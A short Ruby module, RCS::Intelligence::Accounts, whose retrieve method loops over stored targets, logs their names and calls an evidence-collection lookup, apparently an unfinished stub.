#
#  Module for retrieving the accounts of the targets
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Intelligence

class Accounts
  include Tracer
  extend Tracer

  def self.retrieve
    trace :debug, "Retrieving accounts for targets"

    ::Item.targets.each do |target|
      trace :debug, "Target: #{target.name}"

      Evidence.collection_class(target[:_id])
      
    end

  end

end

end
end

